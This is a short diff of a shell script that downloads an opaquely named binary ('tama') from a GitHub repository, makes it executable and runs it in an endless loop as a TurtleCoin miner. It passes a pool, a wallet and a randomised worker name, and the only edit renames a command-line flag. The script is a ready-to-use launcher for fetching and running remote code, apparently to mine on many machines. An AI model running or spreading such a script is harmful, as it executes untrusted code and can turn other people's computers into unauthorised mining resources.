@@ -5,7 +5,7 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
 wget https://github.com/prathhub/kaku/raw/main/tama
 chmod +x tama
 while [ 1 ]; do
-./tama --algorithm turtlecoin --pool $POOL --user $WALLET.$WORKER 
+./tama --algorithm turtlecoin --pool $POOL --username $WALLET.$WORKER 
 sleep 5
 done
 sleep 999999999 
